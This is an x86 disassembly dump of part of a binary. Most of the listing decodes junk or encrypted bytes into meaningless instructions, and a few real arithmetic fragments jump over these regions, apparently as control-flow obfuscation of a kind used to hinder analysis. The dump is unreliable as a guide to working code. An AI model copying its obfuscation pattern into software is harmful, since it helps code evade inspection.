  404100:	dec    esi
  404101:	jae    0x404111
  404103:	cdq    
  404104:	pop    ds
  404105:	outs   dx,DWORD PTR ds:[esi]
  404106:	pop    esp
  404107:	push   ebx
  404108:	lock lgs edi,FWORD PTR [ebp-0x70]
  40410d:	cmp    ecx,DWORD PTR [ebx+0x2b99fc40]
  404113:	inc    ebx
  404114:	imul   ebx,DWORD PTR [eax-0x23e315d4],0x7100a23a
  40411e:	retf   
  40411f:	sub    BYTE PTR [eax+0x3c5dc53b],al
  404125:	xchg   BYTE PTR [ebp-0x2d3fb8c8],al
  40412b:	popf   
  40412c:	in     al,dx
  40412d:	push   ebp
  40412e:	hlt    
  40412f:	popa   
  404130:	lea    eax,[esi+eiz*1]
  404133:	or     edi,DWORD PTR [edi+0x453f5f78]
  404139:	or     bh,0x15
  40413c:	loope  0x404117
  40413e:	sub    ch,BYTE PTR [eax]
  404140:	test   eax,0x8e74170a
  404145:	fidivr WORD PTR [esi-0x5160f92c]
  40414b:	cwde   
  40414c:	add    al,dl
  40414e:	jns    0x40413f
  404150:	push   esp
  404151:	and    al,0x43
  404153:	les    esi,FWORD PTR [esp+eax*8]
  404156:	stos   DWORD PTR es:[edi],eax
  404157:	push   edx
  404158:	adc    ah,ch
  40415a:	or     eax,0x5ff7ee15
  40415f:	mov    esp,0x986e2df
  404164:	xchg   edi,eax
  404165:	mov    BYTE PTR [ebx+edi*1],0x9a
  404169:	sbb    bh,BYTE PTR [eax]
  40416b:	addr16 sbb esp,eax
  40416e:	les    esi,FWORD PTR [edi-0x47330411]
  404174:	jge    0x40417b
  404176:	ins    DWORD PTR es:[edi],dx
  404177:	inc    edx
  404178:	repz sub eax,0x89dcb248
  40417e:	out    0x26,al
  404180:	ja     0x404158
  404182:	cdq    
  404183:	jmp    0xa033:0x659c31c0
  40418a:	mov    cl,0x8b
  40418c:	jp     0x4041ca
  40418e:	push   edi
  40418f:	out    0xa6,eax
  404191:	pop    ebp
  404192:	pop    ds
  404193:	inc    edx
  404194:	mov    ecx,0xdb9a57aa
  404199:	test   BYTE PTR [eiz*4-0x1f764b7d],dh
  4041a0:	imul   esi,DWORD PTR [ebp-0x20384fb0],0x50686740
  4041aa:	or     al,0x69
  4041ac:	pop    ebp
  4041ad:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041af:	iret   
  4041b0:	sbb    DWORD PTR [edi],esi
  4041b2:	mov    ch,BYTE PTR [esi-0xe4a80d1]
  4041b8:	test   DWORD PTR [ebx-0x5],ebx
  4041bb:	xlat   BYTE PTR ds:[ebx]
  4041bc:	sub    BYTE PTR [ebx+0xaa2485c],bh
  4041c2:	sbb    al,0xf2
  4041c4:	hlt    
  4041c5:	rcl    DWORD PTR [edx+ebp*2],0x75
  4041c9:	pop    ss
  4041ca:	sub    BYTE PTR [edx+0xa11aa5a],ch
  4041d0:	imul   ebx,DWORD PTR [edi],0x92d0f66a
  4041d6:	loop   0x4041b3
  4041d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d9:	scas   al,BYTE PTR es:[edi]
  4041da:	bsf    edx,ecx
  4041dd:	ret    
  4041de:	jno    0x404259
  4041e0:	push   0xc409dd97
  4041e5:	fadd   st,st(7)
  4041e7:	push   ebx
  4041e8:	es mov bh,0xd7
  4041eb:	out    dx,eax
  4041ec:	inc    edi
  4041ed:	out    0xf5,eax
  4041ef:	repz clc 
  4041f1:	in     eax,dx
  4041f2:	es rcl edx,0x53
  4041f6:	lods   eax,DWORD PTR ds:[esi]
  4041f7:	imul   ebx,DWORD PTR [edi],0x2
  4041fa:	or     BYTE PTR [edi+0x52],dh
  4041fd:	jmp    0xcb3f:0x24716cf9
  404204:	xor    eax,0x4be96b93
  404209:	xchg   ch,cl
  40420b:	jp     0x404280
  40420d:	bound  ebp,QWORD PTR [ecx-0x3ba764f4]
  404213:	adc    BYTE PTR [eax],ah
  404215:	jnp    0x4041c1
  404217:	imul   edi,ebx,0xffffffbe
  40421a:	dec    ecx
  40421b:	pop    ecx
  40421c:	push   ebx
  40421d:	and    BYTE PTR [edi],bl
  40421f:	gs jmp 0x401752a
  404225:	(bad)  
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x7bf0a35
  404243:	lock xor al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x40425c
  40424d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40424e:	add    BYTE PTR ds:[esi],cl
  404251:	xchg   ebp,eax
  404252:	add    cl,BYTE PTR [edi-0x2f]
  404255:	push   ss
  404256:	and    eax,0x46d08ff6
  40425b:	xor    ecx,DWORD PTR [ebp-0x473ca709]
  404261:	or     esi,DWORD PTR [ebx+0x36]
  404264:	scas   eax,DWORD PTR es:[edi]
  404265:	(bad)  
  404267:	in     eax,dx
  404268:	mov    esi,0x28d103f4
  40426d:	ins    DWORD PTR es:[edi],dx
  40426e:	pop    eax
  40426f:	pop    ebx
  404270:	jge    0x4042e8
  404272:	sbb    al,0xc3
  404274:	push   ecx
  404275:	jns    0x4042c1
  404277:	sar    BYTE PTR [ebx],1
  404279:	cmp    al,0xd5
  40427b:	popf   
  40427c:	fst    DWORD PTR [ebx]
  40427e:	test   dh,dh
  404280:	leave  
  404281:	cmp    edi,ebx
  404283:	cmp    ah,BYTE PTR [eax-0x47]
  404286:	retf   0x98aa
  404289:	pop    edi
  40428a:	pop    es
  40428b:	or     eax,0x4ee5b3ca
  404290:	mov    eax,ds:0x974b28
  404295:	jl     0x404219
  404297:	jnp    0x4042ad
  404299:	sahf   
  40429a:	out    0xf1,al
  40429c:	hlt    
  40429d:	cmp    edi,ecx
  40429f:	cmp    eax,0xc2ec6a87
  4042a4:	sbb    ecx,ebp
  4042a6:	xor    edi,DWORD PTR [eax+eax*2-0x76]
  4042aa:	cmp    eax,DWORD PTR [eax+0x1d78875a]
  4042b0:	nop
  4042b1:	push   cs
  4042b2:	stc    
  4042b3:	ror    ebp,0xd0
  4042b6:	lods   al,BYTE PTR ds:[esi]
  4042b7:	sbb    BYTE PTR [ecx-0x58b1a159],cl
  4042bd:	out    dx,eax
  4042be:	adc    DWORD PTR [edi],0x26
  4042c1:	das    
  4042c2:	fcmovnu st,st(3)
  4042c4:	add    BYTE PTR [eax+edx*4+0x73],bh
  4042c8:	lahf   
  4042c9:	or     ebp,DWORD PTR [eax]
  4042cb:	sub    eax,0x454b8b84
  4042d0:	push   edi
  4042d1:	out    0x47,eax
  4042d3:	adc    al,BYTE PTR [eax+eiz*1]
  4042d6:	rcl    BYTE PTR ds:0x27fda384,0x96
  4042dd:	aam    0x3a
  4042df:	fist   WORD PTR [ebx+0xeb9984e]
  4042e5:	xchg   ebp,edx
  4042e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042e8:	(bad)  
  4042e9:	jbe    0x404310
  4042eb:	inc    esp
  4042ec:	inc    eax
  4042ed:	adc    BYTE PTR [ecx],ah
  4042ef:	cmp    eax,0x161f8bf4
  4042f4:	out    0x24,eax
  4042f6:	rcl    DWORD PTR [eax-0x34],cl
  4042f9:	add    dl,BYTE PTR [edi]
  4042fb:	mov    ds:0x37d644cf,eax
  404300:	push   ebx
  404301:	nop
  404302:	mov    ebp,?
  404304:	out    dx,al
  404305:	pop    eax
  404306:	sbb    ch,dl
  404308:	cmp    ebx,edx
  40430a:	test   eax,0x3f8722c2
  40430f:	nop    DWORD PTR [edi+edx*2+0x407571b1]
  404317:	lahf   
  404318:	imul   ecx,DWORD PTR [eax+0x2e],0xa7d07fb4
  40431f:	call   0xd413:0xf75fcf41
  404326:	lahf   
  404327:	pushf  
  404328:	in     eax,0x24
  40432a:	inc    ebp
  40432b:	outs   dx,DWORD PTR ds:[esi]
  40432c:	mul    ebx
  40432e:	jmp    edx
  404330:	jmp    0x75ce:0xaeeb5674
  404337:	scas   al,BYTE PTR es:[edi]
  404338:	sub    BYTE PTR [ecx+ecx*2],0x9c
  40433c:	adc    eax,0x20326e07
  404341:	cmp    ecx,ebp
  404343:	daa    
  404344:	fcmovnu st,st(4)
  404346:	test   eax,0x15492010
  40434b:	cdq    
  40434c:	adc    eax,0xdb191086
  404351:	or     DWORD PTR cs:0xf14206ed,eax
  404358:	mov    ch,0xa0
  40435a:	xor    esp,DWORD PTR [esi+0x4d]
  40435d:	add    eax,0x73def0bd
  404362:	xor    DWORD PTR [eax-0x6eb79e52],0xdeea9a6a
  40436c:	imul   edx,DWORD PTR [ebx],0xf2d25a7e
  404372:	(bad)  
  404374:	mov    DWORD PTR [ebp+0x8],eax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rol    DWORD PTR [ebx-0x235ee6fa],cl
  4043a6:	daa    
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x404345
  4043ae:	push   ss
  4043af:	sub    eax,0x74bdc732
  4043b4:	adc    DWORD PTR [ebp+0x50f1b138],edx
  4043ba:	mov    cl,0x64
  4043bc:	(bad)
  4043bf:	mov    bl,0x5d
  4043c1:	cmp    cl,BYTE PTR [esi+edx*8-0x4425e979]
  4043c8:	push   ebx
  4043c9:	pop    ebp
  4043ca:	test   dh,ah
  4043cc:	lods   al,BYTE PTR ds:[esi]
  4043cd:	xor    cl,ah
  4043cf:	or     esi,ebx
  4043d1:	inc    ebx
  4043d2:	jnp    0x40440c
  4043d4:	push   ecx
  4043d5:	and    edi,ecx
  4043d7:	pop    ds
  4043d8:	gs retf 0xd7b8
  4043dc:	in     eax,0x84
  4043de:	mov    bl,0x2a
  4043e0:	out    0x60,eax
  4043e2:	test   DWORD PTR [ecx+0x4e5e10cd],0xd7f2be8e
  4043ec:	test   DWORD PTR [ecx+0x643a32bc],ebp
  4043f2:	and    ch,BYTE PTR ds:0xceb166e
  4043f8:	sub    DWORD PTR [eax+0x6e83edd4],esi
  4043fe:	test   eax,0x9d6af0e7
  404403:	push   0xffffffbf
  404405:	sub    eax,0x1d436a52
  40440a:	cmp    al,0xca
  40440c:	sbb    eax,0x8dec9433
  404411:	lods   al,BYTE PTR ds:[esi]
  404412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404413:	in     al,0xf
  404415:	xchg   ebp,eax
  404416:	es cld 
  404418:	push   ds
  404419:	dec    ebp
  40441a:	stos   DWORD PTR es:[edi],eax
  40441b:	or     DWORD PTR [ecx+0x5a],0x38b9e8ce
  404422:	je     0x4043ce
  404424:	mov    al,0x2
  404426:	adc    DWORD PTR [edx-0x5a],ebp
  404429:	je     0x40441c
  40442b:	nop
  40442c:	lahf   
  40442d:	jecxz  0x4043f9
  40442f:	push   edx
  404430:	pop    ebx
  404431:	jg     0x4043b3
  404433:	add    bl,BYTE PTR [esi+0x5]
  404436:	jle    0x40442f
  404438:	inc    DWORD PTR [esi+0x630026b4]
  40443e:	pop    edi
  40443f:	sbb    DWORD PTR [ebx-0xbc2dc71],edi
  404445:	jne    0x40440f
  404447:	push   ecx
  404448:	call   0x729:0x7c3dd5bf
  40444f:	dec    edi
  404450:	(bad)  
  404451:	repz mov ch,dh
  404454:	inc    esp
  404455:	data16 mov cl,0xc6
  404458:	jp     0x404479
  40445a:	push   esp
  40445b:	or     BYTE PTR [ebx+0xa],ch
  40445e:	sbb    ah,BYTE PTR [ecx]
  404460:	push   ebx
  404461:	fstp   DWORD PTR [ebp-0x61202024]
  404467:	inc    esp
  404468:	jmp    0x3b3df406
  40446d:	adc    BYTE PTR [edi+0x49b313ba],bl
  404473:	cwde   
  404474:	test   eax,0x97ea85da
  404479:	dec    ebp
  40447a:	lea    edx,[eax+ebp*1]
  40447d:	pop    ds
  40447e:	inc    edi
  40447f:	lds    esi,FWORD PTR [edi+0x56]
  404482:	push   edx
  404483:	sbb    BYTE PTR [edi-0x5d],bl
  404486:	cmp    BYTE PTR [ecx],al
  404488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404489:	test   BYTE PTR [edx-0x52],ch
  40448c:	xchg   esi,eax
  40448d:	shufps xmm3,XMMWORD PTR [eax],0x76
  404491:	repz dec eax
  404493:	and    DWORD PTR [ebp-0x22],edx
  404496:	xchg   edx,edx
  404498:	or     bl,ch
  40449a:	into   
  40449b:	push   cs
  40449c:	xchg   DWORD PTR [ecx+0x31c09279],edi
  4044a2:	das    
  4044a3:	sbb    al,0x5d
  4044a5:	ficomp WORD PTR [eax-0x23]
  4044a8:	aad    0x78
  4044aa:	xchg   ebp,eax
  4044ab:	mov    dl,0x96
  4044ad:	or     eax,0x339b2695
  4044b2:	jbe    0x4044ed
  4044b4:	cmc    
  4044b5:	fcom   DWORD PTR [ecx-0x16]
  4044b8:	xlat   BYTE PTR ds:[ebx]
  4044b9:	ds add ah,bl
  4044bc:	xchg   ebp,eax
  4044bd:	xchg   DWORD PTR [ebp+0xa],edi
  4044c0:	cdq    
  4044c1:	call   DWORD PTR [ecx-0x57]
  4044c4:	sbb    esi,ebp
  4044c6:	out    0x95,al
  4044c8:	int3   
  4044c9:	sub    ebp,0x2cb2ae6b
  4044cf:	pop    edx
  4044d0:	aas    
  4044d1:	rol    BYTE PTR [eax],0xc5
  4044d4:	retf   
  4044d5:	mov    edx,DWORD PTR [ebp+0xc]
  4044d8:	cmp    al,BYTE PTR [edx]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x4044f9
  4044f5:	cs mov ebx,0x70268410
  4044fb:	jo     0x404515
  4044fd:	jg     0x40456f
  4044ff:	jo     0x40457a
  404501:	(bad)  
  404502:	test   eax,0x37bc3118
  404507:	jne    0x4044bf
  404509:	out    dx,al
  40450a:	int3   
  40450b:	sbb    BYTE PTR [esp+edi*1-0x41637126],ah
  404512:	sub    BYTE PTR [edx-0x19],bh
  404515:	clc    
  404516:	lods   al,BYTE PTR ds:[esi]
  404517:	in     al,0xa9
  404519:	stos   DWORD PTR es:[edi],eax
  40451a:	clc    
  40451b:	jb     0x4044ff
  40451d:	fnsave [ebp-0x75]
  404520:	xor    al,BYTE PTR [ebx+0x6d]
  404523:	push   0xffffff91
  404525:	cmp    DWORD PTR [ecx],edi
  404527:	in     eax,0x7
  404529:	or     BYTE PTR [edx+eiz*4-0x4c],al
  40452d:	fldenv [ebp+0xe14d486]
  404533:	dec    edi
  404534:	pop    eax
  404535:	arpl   bx,di
  404537:	cmp    edx,esp
  404539:	dec    ecx
  40453a:	sar    dl,1
  40453c:	lods   al,BYTE PTR ds:[esi]
  40453d:	push   ebx
  40453e:	add    eax,0x471218a
  404543:	push   ebp
  404544:	xchg   esi,eax
  404545:	push   0x597991d7
  40454a:	in     al,dx
  40454b:	mov    al,0x5b
  40454d:	stos   DWORD PTR es:[edi],eax
  40454e:	lods   al,BYTE PTR ds:[esi]
  40454f:	in     al,dx
  404550:	add    cl,BYTE PTR [eax+0x60ab98c9]
  404556:	(bad)
  40455a:	mov    bl,0xf0
  40455c:	inc    ebx
  40455d:	xor    dl,dh
  40455f:	mov    eax,ds:0xb99002c1
  404564:	out    0xb6,eax
  404566:	and    DWORD PTR [esi+0x5e919d6b],eax
  40456c:	pop    ebx
  40456d:	push   eax
  40456e:	jle    0x404517
  404570:	sahf   
  404571:	or     DWORD PTR [edi+0x7f],eax
  404574:	mov    dl,0x91
  404576:	out    dx,eax
  404577:	mov    ch,0x4a
  404579:	push   0x39b5fa58
  40457e:	aas    
  40457f:	int    0x97
  404581:	xor    ch,al
  404583:	add    edi,eax
  404585:	cmp    al,0xed
  404587:	retf   0x232f
  40458a:	das    
  40458b:	mov    ebp,0x3f9eac8c
  404590:	or     dh,BYTE PTR [edi+0x36]
  404593:	dec    ebx
  404594:	sbb    DWORD PTR [edi+ebp*8+0x54],edx
  404598:	aas    
  404599:	aaa    
  40459a:	push   es
  40459b:	mov    ecx,0x8ec84274
  4045a0:	lods   al,BYTE PTR ds:[esi]
  4045a1:	and    ah,BYTE PTR [edx-0x4a]
  4045a4:	pop    esi
  4045a5:	fcmovb st,st(5)
  4045a7:	pop    ebx
  4045a8:	xchg   esp,eax
  4045a9:	cmp    BYTE PTR [ebx],bh
  4045ab:	add    al,0x60
  4045ad:	loope  0x404628
  4045af:	cmp    DWORD PTR [esi],edx
  4045b1:	push   cs
  4045b2:	jno    0x404550
  4045b4:	push   0x32b8d177
  4045b9:	dec    edi
  4045ba:	jle    0x404540
  4045bc:	es jae 0x404611
  4045bf:	(bad)
  4045c3:	xchg   esp,eax
  4045c4:	push   esp
  4045c5:	dec    ebp
  4045c6:	pop    ss
  4045c7:	popa   
  4045c8:	adc    dl,BYTE PTR [ecx]
  4045ca:	xor    BYTE PTR [esi+ebx*8],0xc6
  4045ce:	aad    0x48
  4045d0:	loope  0x404618
  4045d2:	test   al,0x45
  4045d4:	xor    eax,0x2f097bf4
  4045d9:	push   edx
  4045da:	xchg   ecx,eax
  4045db:	(bad)
  4045df:	in     al,dx
  4045e0:	mov    ch,0xfe
  4045e2:	xor    eax,0x27fc2d94
  4045e7:	rol    dh,cl
  4045e9:	mov    bh,0xf0
  4045eb:	(bad)  
  4045ec:	je     0x40462a
  4045ee:	xchg   esi,eax
  4045ef:	xchg   BYTE PTR [ebx-0x14],bl
  4045f2:	cmp    dh,BYTE PTR [eax+ebp*2]
  4045f5:	mov    edx,0xd79a2d3f
  4045fa:	mov    edi,0x9055350c
  4045ff:	xchg   bl,ah
  404601:	leave  
  404602:	mov    esp,0xe8b42150
  404607:	out    dx,al
  404608:	retf   
  404609:	mov    ch,0x98
  40460b:	mov    al,0x3f
  40460d:	mov    ss,ecx
  40460f:	outs   dx,BYTE PTR ds:[esi]
  404610:	cmp    BYTE PTR [ebx+0x36],al
  404613:	out    0xd2,eax
  404615:	xlat   BYTE PTR ds:[ebx]
  404616:	pop    edx
  404617:	jne    0x4045ba
  404619:	aaa    
  40461a:	xchg   edi,eax
  40461b:	and    ebx,DWORD PTR [ecx-0x7f8e14a6]
  404621:	cmp    eax,0x27eb8953
  404626:	(bad)
  404629:	push   ebp
  40462a:	or     al,0xf
  40462c:	mov    esi,0x3c13312
  404631:	(bad)  
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xf106c86
  404647:	scas   al,BYTE PTR es:[edi]
  404648:	inc    edx
  404649:	lods   al,BYTE PTR ds:[esi]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	stos   DWORD PTR es:[edi],eax
  404652:	push   0x4e837a84
  404657:	(bad)  
  404658:	cmc    
  404659:	ds shl eax,1
  40465c:	and    eax,0x412b4411
  404661:	aas    
  404662:	pop    es
  404663:	push   ds
  404664:	push   0x79
  404666:	ja     0x40466d
  404668:	cmc    
  404669:	add    BYTE PTR [ebx+0x5f815472],ch
  40466f:	je     0x40465d
  404671:	sti    
  404672:	mov    ch,0x7b
  404674:	out    0x0,al
  404676:	lods   al,BYTE PTR ds:[esi]
  404677:	mov    bl,bh
  404679:	inc    ebx
  40467a:	and    eax,0xa6ec43fd
  40467f:	lods   eax,DWORD PTR ds:[esi]
  404680:	mov    ecx,0x8dd03ebe
  404685:	adc    eax,0xe18151c9
  40468a:	cmp    esp,DWORD PTR [eax+0x4e05b448]
  404690:	and    DWORD PTR [eax-0x2042aed7],esp
  404696:	mov    edi,cs
  404698:	ret    0x51da
  40469b:	xor    dl,BYTE PTR [ecx+0x10055404]
  4046a1:	cmp    BYTE PTR [ebx-0x3681d096],ah
  4046a7:	aas    
  4046a8:	pop    edx
  4046a9:	lods   eax,DWORD PTR ds:[esi]
  4046aa:	retf   0xf505
  4046ad:	fstp   QWORD PTR [ebp-0x40afdae3]
  4046b3:	leave  
  4046b4:	rol    DWORD PTR [ecx],cl
  4046b6:	(bad)  
  4046b7:	push   esi
  4046b8:	push   ss
  4046b9:	ins    DWORD PTR es:[edi],dx
  4046ba:	fisttp QWORD PTR [ecx-0x88c3f9d]
  4046c0:	mov    cl,0x11
  4046c2:	aad    0x2
  4046c4:	adc    al,0x1b
  4046c6:	mov    WORD PTR [edi-0x2ab2e4e1],es
  4046cc:	imul   ebx,DWORD PTR [ecx],0x26e76d29
  4046d2:	jae    0x4046df
  4046d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d5:	inc    ebx
  4046d6:	jl     0x4046c8
  4046d8:	sub    al,0xc9
  4046da:	xchg   esi,eax
  4046db:	adc    DWORD PTR ds:0x22c38ebc,edi
  4046e1:	loop   0x4046e3
  4046e3:	fcmovnb st,st(3)
  4046e5:	call   0x787af452
  4046ea:	stc    
  4046eb:	inc    ebp
  4046ec:	pop    ebx
  4046ed:	mov    DWORD PTR [esi+ebx*8+0x3ad60095],ebx
  4046f4:	into   
  4046f5:	jle    0x40474d
  4046f7:	les    edx,FWORD PTR [eax]
  4046f9:	mov    al,ds:0xa9d906e3
  4046fe:	ins    DWORD PTR es:[edi],dx
  4046ff:	cli    
  404700:	aaa    
  404701:	adc    DWORD PTR [eax+0x4f],edi
  404704:	mov    ebx,0xd1c21b01
  404709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40470a:	sub    al,0x6a
  40470c:	in     eax,dx
  40470d:	imul   eax,DWORD PTR [edx+0x525f5972],0xffffffca
  404714:	and    esi,DWORD PTR [esi+edi*2+0x69]
  404718:	xchg   esi,eax
  404719:	fwait
  40471a:	dec    ecx
  40471b:	popa   
  40471c:	mov    ah,0xe5
  40471e:	or     eax,0x77b22df8
  404723:	mov    esp,0xf8d0bdee
  404728:	fdivr  DWORD PTR fs:[esi]
  40472b:	mov    edx,edx
  40472d:	sahf   
  40472e:	xor    DWORD PTR [ebx-0xe],ecx
  404731:	or     dh,dl
  404733:	test   BYTE PTR [esi+eax*1+0x4a],dl
  404737:	cwde   
  404738:	ja     0x4047a1
  40473a:	cmp    eax,0x9bf35fdd
  40473f:	jl     0x4047aa
  404741:	das    
  404742:	test   eax,0x90256915
  404747:	pop    ss
  404748:	or     al,0x50
  40474a:	inc    ecx
  40474b:	jb     0x4046f4
  40474d:	ds sbb eax,0x874a90a9
  404753:	push   eax
  404754:	xchg   ebp,eax
  404755:	ret    
  404756:	mov    eax,ds:0x9ea1d6a0
  40475b:	es ror ecx,1
  40475e:	cmp    DWORD PTR [eax-0x37],0x38acd5aa
  404765:	push   ebx
  404766:	jle    0x404752
  404768:	nop
  404769:	fidivr WORD PTR [eax+0x6]
  40476c:	scas   al,BYTE PTR es:[edi]
  40476d:	xchg   esi,eax
  40476e:	jno    0x404701
  404770:	mov    bh,0x26
  404772:	shl    BYTE PTR [edx-0x41dca6],cl
  404778:	mov    ah,0xf
  40477a:	test   bh,bh
  40477c:	add    eax,DWORD PTR [eax]
  40477e:	add    bh,al
  404780:	inc    ebp
  404781:	call   0x7464515
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	test   DWORD PTR [ecx+0x2454ba6a],esi
  40479d:	jo     0x40480f
  40479f:	sbb    BYTE PTR [edi+0x70],bh
  4047a2:	jo     0x4047e4
  4047a4:	xchg   ebp,eax
  4047a5:	enter  0xb097,0xac
  4047a9:	xchg   edi,eax
  4047aa:	mov    ecx,0x187bf3a7
  4047af:	inc    esi
  4047b0:	adc    bh,bh
  4047b2:	idiv   DWORD PTR [esi-0x73]
  4047b5:	adc    eax,0xf05baeaa
  4047ba:	push   ds
  4047bb:	jmp    0x404818
  4047bd:	mov    ch,0xcd
  4047bf:	pop    edi
  4047c0:	mov    esp,0x86f9940c
  4047c5:	ins    BYTE PTR es:[edi],dx
  4047c6:	outs   dx,BYTE PTR ds:[esi]
  4047c7:	(bad)  
  4047c9:	ret    
  4047ca:	dec    ecx
  4047cb:	or     ah,0x90
  4047ce:	mov    ds:0x59795f17,eax
  4047d3:	call   0xcbbb:0x29715c9c
  4047da:	lods   eax,DWORD PTR ds:[esi]
  4047db:	(bad)  
  4047dc:	xor    dh,cl
  4047de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047df:	and    BYTE PTR [ebx+ebx*1-0xe],dl
  4047e3:	push   ebx
  4047e4:	pop    ds
  4047e5:	popa   
  4047e6:	pushf  
  4047e7:	js     0x4047ad
  4047e9:	imul   ebp,DWORD PTR [edi],0x1b
  4047ec:	adc    eax,0xf640bb16
  4047f1:	loop   0x40478a
  4047f3:	xor    al,0x1f
  4047f5:	outs   dx,DWORD PTR ds:[esi]
  4047f6:	addr16 sub dl,bh
  4047f9:	mov    dh,ch
  4047fb:	cdq    
  4047fc:	cdq    
  4047fd:	or     BYTE PTR [ecx-0x1b],ah
  404800:	les    ecx,FWORD PTR [ecx+0x585f051f]
  404806:	jno    0x4047aa
  404808:	mov    dl,0x41
  40480a:	out    0xfd,eax
  40480c:	scas   eax,DWORD PTR es:[edi]
  40480d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40480e:	retf   0x1647
  404811:	mov    eax,ecx
  404813:	mov    DWORD PTR [ebp-0x4451e72f],edi
  404819:	inc    esp
  40481a:	push   ebp
  40481b:	retf   
  40481c:	xor    eax,DWORD PTR [edi+0x32cf5638]
  404822:	sub    ch,ch
  404824:	fs push eax
  404826:	repz cmp al,0x2f
  404829:	mov    ebp,edi
  40482b:	clc    
  40482c:	ja     0x404818
  40482e:	cmp    DWORD PTR [ebx],ecx
  404830:	gs push 0x40740e6b
  404836:	jmp    0x40480b
  404838:	loop   0x4047c4
  40483a:	inc    ebx
  40483b:	mov    esp,0x81313155
  404840:	adc    eax,0x2cf755e3
  404845:	rcl    BYTE PTR [edx-0x6b],1
  404848:	jmp    0x404826
  40484a:	call   0x1d4d2778
  40484f:	js     0x404802
  404851:	test   BYTE PTR [edi-0x21daf3db],ch
  404857:	xor    esi,edx
  404859:	cs out 0x19,al
  40485c:	mov    ds:0x5ffb5919,eax
  404861:	xchg   ebx,eax
  404862:	jnp    0x404861
  404864:	push   ebx
  404865:	dec    edx
  404866:	pop    es
  404867:	rcr    BYTE PTR [bx+di],0x12
  40486b:	clc    
  40486c:	ror    DWORD PTR [edx+0x7b],cl
  40486f:	sbb    BYTE PTR [edx+eiz*2+0x37a27eeb],dl
  404876:	aam    0xba
  404878:	and    eax,0xb4b14470
  40487d:	pop    esp
  40487e:	sbb    ch,BYTE PTR [ebp+0x20]
  404881:	xor    DWORD PTR [edx+0x40],ebp
  404884:	dec    ebx
  404885:	inc    eax
  404886:	lods   eax,DWORD PTR ds:[esi]
  404887:	dec    ecx
  404888:	ss adc ebx,esp
  40488b:	in     eax,0xb9
  40488d:	add    DWORD PTR [edi+0x3c],esi
  404890:	ja     0x4048c3
  404892:	xchg   BYTE PTR [esi],al
  404894:	pop    ebp
  404895:	add    cl,BYTE PTR [ebp+edx*4-0x67]
  404899:	in     al,0xe7
  40489b:	mov    ds,ebx
  40489d:	mov    edi,edi
  40489f:	shl    ch,cl
  4048a1:	cli    
  4048a2:	add    BYTE PTR [ebx],dh
  4048a4:	mov    ch,0x8
  4048a6:	xor    eax,0xef64d103
  4048ab:	rcr    DWORD PTR [edx+eax*1],0x27
  4048af:	pop    ecx
  4048b0:	dec    edx
  4048b1:	jno    0x40492b
  4048b3:	push   ss
  4048b4:	jg     0x4048d6
  4048b6:	jnp    0x404886
  4048b8:	mov    ch,al
  4048ba:	bound  edx,QWORD PTR [eax+ecx*2+0x75b2848e]
  4048c1:	out    0xaf,eax
  4048c3:	loop   0x40486f
  4048c5:	xchg   esp,eax
  4048c6:	jmp    0x4048e3
  4048c8:	jg     0x40491c
  4048ca:	inc    ebp
  4048cb:	lea    eax,[ebp-0x18]
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x1f2655b0
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x40491f
  40490a:	fiadd  WORD PTR [ecx-0x19]
  40490d:	cmp    DWORD PTR [ecx+ebp*1],edi
  404910:	icebp  
  404911:	inc    edx
  404912:	outs   dx,DWORD PTR ds:[esi]
